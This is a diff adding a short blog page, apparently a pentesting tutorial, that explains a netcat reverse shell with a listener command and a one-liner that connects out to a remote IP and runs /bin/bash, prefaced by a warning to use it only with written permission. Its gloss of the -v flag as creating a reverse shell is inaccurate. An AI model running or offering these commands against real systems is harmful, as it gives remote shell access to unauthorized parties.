@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+  <head>
+   <title>Ahwx.ORG >> Blog</title>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1">
+   <link rel="icon" type="image/x-icon" href="https://ahwx.org/img/avatar.png">
+   <meta charset="UTF-8">
+   <meta http-equiv="X-UA-Compatible" content="IE=edge">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <link rel="shortcut icon" href="/favicon.jpg"/>
+   <meta name="description" content="Ahwx' Blog">
+   <meta property="og:title" content="Blog » Ahwx.org">
+   <meta property="og:site_name" content="Ahwx.org">
+   <meta property="og:url" content="https://Ahwx.org">
+   <meta property="og:description" content="Ahwx' Blog">
+   <meta property="og:type" content="website">
+   <meta name="twitter:title" content="Blog » Ahwx.org">
+   <meta name="twitter:description" content="Ahwx' Blog">
+   <meta name="keywords" content="Ahwx, Ahwx.org, GitHub, github, tutorials, blog, linux, archlinux, gnu, privacy"/>
+   <link rel="stylesheet" href="https://ahwx.org/style.css">
+   <meta name="title" content="Ahwx"/>
+   <meta name="description" content="Ahwx' Blog"/>
+   <meta name="theme-color" content="#1e1e2e"/>
+   <meta property="twitter:url" content="https://ahwx.org"/>
+  </head>
+
+
+  <script src="https://ahwx.org/header.js"></script>
+  <div class="container"><br><br><br>
+<h1><strong>Warning</strong>! Use for pentesting <strong>only</strong>, <strong>and</strong> only with targets that you have a <strong>written</strong> <a href="https://www.netspi.com/blog/technical/social-engineering-penetration-testing/get-out-of-jail-letter/">get out of jail free card</a> and/or <strong>written permission</strong> for.</h1>
+
+<h3>listen for a connection: (you could i.e. use this in a script and get a webrequest with a special agent using curl and then make a cronjob out of grepping the nginx acces log associated with your vhost, which shows the ip, then you try to connect.)</h3>
+
+<p><code>nc -lv 1203</code></p>
+
+<p>nc is the command to call our program; netcat. -lv implies that we want to listen for shells; 1203 is the port we will use to listen for shells</p>
+
+<h3>open connection on remote host:</h3>
+
+<p><code>nc -v 10.0.0.1 1203 -e /bin/bash</code></p>
+
+<p>nc is the command to call our program; netcat once again. -v tells it that we want to make a reverse shell; 10.0.0.1 is the ip of the listener (the above command); 1203 is once again the port to connect to. /bin/bash is the program to execute, in this case a shell, but you can alo pipe output of a program or file to the reverse shell</p>
+</div>
+<script src="https://ahwx.org/footer.js"></script>
